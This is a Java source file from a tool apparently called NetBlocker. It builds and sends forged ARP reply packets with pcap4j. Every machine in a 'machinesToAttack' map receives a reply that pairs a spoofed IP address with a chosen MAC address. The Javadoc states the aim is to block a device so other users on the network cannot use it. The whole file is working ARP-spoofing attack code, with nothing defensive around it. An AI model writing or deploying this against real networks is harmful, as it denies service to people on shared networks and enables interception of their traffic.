package NetBlocker.sender;

import org.pcap4j.core.PcapHandle;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;

import java.net.InetAddress;
import java.util.Map;

public class ArpReplySender implements Runnable {

    private final PcapHandle sendHandle;

    //Mac address used in the source of the fake ARP reply
    private final MacAddress macAddress;

    //Ip address used in the source of the fake ARP reply
    private final InetAddress ipAddress; // spoof ip address

    //A map of ip address and Mac address to send fake ARP reply
    private final Map<InetAddress, MacAddress> machinesToAttack;

    /**
     * This class is used to send fake ARP reply packets to block the device so other users on the network can not use it
     *
     * @param sendHandle       pcap handle used send packets
     * @param macAddress       Mac address used in the source of the fake ARP reply
     * @param ipAddress        Ip address used in the source of the fake ARP reply
     * @param machinesToAttack A map of ip address and Mac address to send fake ARP reply
     */

    public ArpReplySender(PcapHandle sendHandle, MacAddress macAddress, InetAddress ipAddress, Map<InetAddress, MacAddress> machinesToAttack) {
        this.sendHandle = sendHandle;
        this.macAddress = macAddress;
        this.ipAddress = ipAddress;
        this.machinesToAttack = machinesToAttack;
    }

    @Override
    public void run() {
        try {
            machinesToAttack.forEach(this::sendArpReply);
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
    }

    private void sendArpReply(InetAddress receiverIpAddress, MacAddress receiverMacAddress) {
        ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
        arpBuilder
                .hardwareType(ArpHardwareType.ETHERNET)
                .protocolType(EtherType.IPV4)
                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                .operation(ArpOperation.REPLY)
                .srcHardwareAddr(this.macAddress)
                .srcProtocolAddr(this.ipAddress)
                .dstHardwareAddr(receiverMacAddress)
                .dstProtocolAddr(receiverIpAddress);

        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
        etherBuilder.dstAddr(receiverMacAddress)
                .srcAddr(this.macAddress)
                .type(EtherType.ARP)
                .payloadBuilder(arpBuilder)
                .paddingAtBuild(true);

        Packet packet = etherBuilder.build();
        try {
            sendHandle.sendPacket(packet);
        } catch (Exception ex) {
            ex.printStackTrace();
            System.exit(1);
        }
    }
}
